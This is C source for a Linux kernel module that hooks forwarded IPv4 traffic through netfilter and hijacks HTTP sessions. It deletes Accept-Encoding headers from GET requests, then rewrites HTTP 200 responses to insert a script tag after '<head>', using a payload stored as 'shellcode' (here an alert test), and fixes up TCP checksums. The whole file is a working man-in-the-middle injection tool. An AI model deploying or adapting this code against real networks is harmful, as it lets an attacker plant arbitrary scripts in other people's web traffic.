#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
// #include <linux/inet.h>
#include <linux/if_packet.h>
// #include <linux/socket.h>
#include <linux/skbuff.h>

#include <net/ip.h>
#include <net/tcp.h>

#include <net/netfilter/nf_conntrack.h>
#include <net/netfilter/nf_conntrack_helper.h>
// #include <net/netfilter/nf_conntrack_expect.h>
#include <net/netfilter/nf_nat.h>
// #include <net/netfilter/nf_nat_core.h>
#include <net/netfilter/nf_nat_helper.h>

char shellcode[] = "<head>\n<script>alert('-----hijacking test----')</script>";

int delete_accept_encoding(char *pkg)
{
	char *pK = NULL;
	char *pV = NULL;
	int len = 0;
	
	pK = strstr(pkg,"Accept: text/html");
	if(pK == NULL)
		return 0;

	pK = strstr(pkg,"Accept-Encoding:");
	if(pK == NULL)
		return 0;
	
	printk(KERN_ALERT "hook_ipv4: Accept-Encoding found\n");
	
	pV = strstr(pK,"\r\n");
	if(pV == NULL)
		return 0;
	
	len = (long long)pV - (long long)pK;
	
	printk(KERN_ALERT "hook_ipv4: Delete Accept-Encoding: %d\n",len);
	
	memset(pK,' ',len + 2);
	return 1;
}

// int delete_transfer_encoding(char *pkg)
// {
// 	char *pK = NULL;
// 	char *pV = NULL;
// 	int len = 0;
	
// 	pK = strstr(pkg,"Transfer-Encoding:");
// 	if(pK == NULL)
// 		return 0;
	
// 	printk(KERN_ALERT "hook_ipv4: Transfer-Encoding found\n");
	
// 	pV = strstr(pK,"\r\n");
// 	if(pV == NULL)
// 		return 0;
	
// 	len = (long long)pV - (long long)pK;
	
	
// 	memset(pK,' ',len + 2);
// 	// memcpy(pK+18, "identity", 8);

// 	// printk(KERN_ALERT "hook_ipv4: Delete Transfer-Encoding: \n%s\n",pK);

// 	return 1;
// }

unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))
{
	struct iphdr *iph = ip_hdr(skb);
	unsigned short iph_len = ip_hdrlen(skb);
	unsigned short tol_len = ntohs(iph->tot_len);

	if (iph->protocol == IPPROTO_TCP)
	{	
		struct tcphdr *tcph = (void *)iph + iph->ihl * 4;
		unsigned int src_ip = (unsigned int)iph->saddr;
		unsigned int dest_ip = (unsigned int)iph->daddr;

		unsigned int src_port = (unsigned int)ntohs(tcph->source);
		unsigned int dest_port = (unsigned int)ntohs(tcph->dest);
		// printk(KERN_ALERT "hook_ipv4: %pI4:%d --> %pI4:%d \n", &src_ip, src_port, &dest_ip, dest_port);

		// if (0 != skb_linearize(skb)) {
  //           return NF_ACCEPT;
  //       }
		// char *pkg = (char *)((long long)tcph + ((tcph->doff) * 4));
		char *pkg = (char *)skb->data + 40;

		if (src_port == 80)
		{
			if (memcmp(pkg,"HTTP/1.0 200", 12) != 0 && memcmp(pkg,"HTTP/1.1 200", 12) != 0)
			{
				return NF_ACCEPT;
			}

			char *phead = strstr(pkg,"<head>");
			if(phead == NULL){
				return NF_ACCEPT;
			}
			
			enum ip_conntrack_info ctinfo;
			struct nf_conn *ct = nf_ct_get(skb, &ctinfo);
			// delete_transfer_encoding(pkg);

			// printk(KERN_ALERT "---pkg size1: %d\n", strlen(pkg));
			// printk(KERN_ALERT "%s\n", pkg+strlen(pkg)-20);
			// printk(KERN_ALERT "---hook_ipv4: Found Head tag---\n");
			// sudo iptables -t nat --list
			if (ct && nf_nat_mangle_tcp_packet(skb, ct, ctinfo,iph_len,
                                        phead - pkg, 6,
                                        shellcode, strlen(shellcode))) 
			{
                skb->local_df = 0;
            	// skb_shinfo(skb)->gso_size = 0;
                printk("---insert success---\n");
            }
            // kfree(pkg);

            // pkg = (char *)((long long)tcph + ((tcph->doff) * 4));
            // pkg = (char *)skb->data + 40;
            // printk(KERN_ALERT "---pkg size2: %d\n", strlen(pkg));
			// printk(KERN_ALERT "%s\n", pkg+strlen(pkg)-20);
			/////////////////////change chunk size////////////////////////
			// char *pr1 = strstr(pkg,"<");
			// char *pr2 = pr1 - 2; 
			// pr1 -= 3;

			// while(*pr1 != '\n' && *pr1 != '\r')
			// {
			// 	pr1 --;
			// }
			// pr1 ++;

			// char *chunk_size_str = (char*)kmalloc(pr2 - pr1 + 1, GFP_KERNEL);
			// memcpy(chunk_size_str, pr1, pr2 - pr1);
			// memset(chunk_size_str + (pr2 - pr1), '\0', 1);
			
			// int chunk_size; 
			// sscanf(chunk_size_str, "%x", &chunk_size);

			// printk(KERN_ALERT "%s --> %d\n", chunk_size_str, chunk_size);

			// chunk_size += strlen(shellcode);
			// sprintf(chunk_size_str, "%x", chunk_size);
			// printk(KERN_ALERT "%d --> %s\n", chunk_size, chunk_size_str);

			// memcpy(pr1, chunk_size_str, strlen(chunk_size_str));
			// kfree(chunk_size_str);
			//////////////////////////////////////////////////////////////
			
			// char content_len[256];
			// sprintf(content_len,"\r\n%s%d\r\n","Content-Length: ", 2000);

			// char *pK = strstr(pkg,"Content-Type:");
			// pK = strstr(pK,"\r\n");
			// if(pK == NULL)
			// 	return NF_ACCEPT;
			// if (ct && nf_nat_mangle_tcp_packet(skb, ct, ctinfo,iph_len,
   //                                      pK - pkg, 2,
   //                                      content_len, strlen(content_len))) 
			// {
   //          	// printk(KERN_ALERT "%s\n",pK);
   //          }

		}
		else if (dest_port == 80)
		{
			// char *pK = strstr(pkg,"HTTP/1.1");
			// if(pK == NULL)
			// 	return NF_ACCEPT;
			// memcpy(pK, "HTTP/1.0", 8);

			if (memcmp(pkg,"GET",strlen("GET")) != 0)
			{
				return NF_ACCEPT;
			}

			delete_accept_encoding(pkg);
		}
		// unsigned short cs = checksum_tcp(iph, tcph);
		// tcph->check = cs;
		struct rtable *rt = skb_rtable(skb);
        int datalen = skb->len - iph->ihl * 4;
        int oldlen = datalen - strlen(shellcode);
        if (skb->ip_summed != CHECKSUM_PARTIAL) {
            if (!(rt->rt_flags & RTCF_LOCAL) && skb->dev->features
                    & NETIF_F_V4_CSUM) {
                skb->ip_summed = CHECKSUM_PARTIAL;
                skb->csum_start = skb_headroom(skb)
                        + skb_network_offset(skb) + iph->ihl * 4;
                skb->csum_offset = offsetof(struct tcphdr, check);
                tcph->check = ~tcp_v4_check(datalen, iph->saddr,
                        iph->daddr, 0);
            } else {
                tcph->check = 0;
                tcph->check = tcp_v4_check(datalen, iph->saddr,
                        iph->daddr, csum_partial(tcph, datalen, 0));
            }
        } else
            inet_proto_csum_replace2(&tcph->check, skb, htons(oldlen),
                    htons(datalen), 1);
	}
	return NF_ACCEPT;
}

static struct nf_hook_ops http_hooks = 
{ 
	.pf = NFPROTO_IPV4,
    .priority = NF_IP_PRI_MANGLE, 
    .hooknum = NF_INET_FORWARD, 
    .hook = hook_func,
};

int init_module(void)
{
	nf_register_hook(&http_hooks);

	printk(KERN_ALERT "hook_ipv4: insmod\n");

	return 0;
}

void cleanup_module(void)
{
	nf_unregister_hook(&http_hooks);

	printk(KERN_ALERT "hook_ipv4: rmmod\n");
}
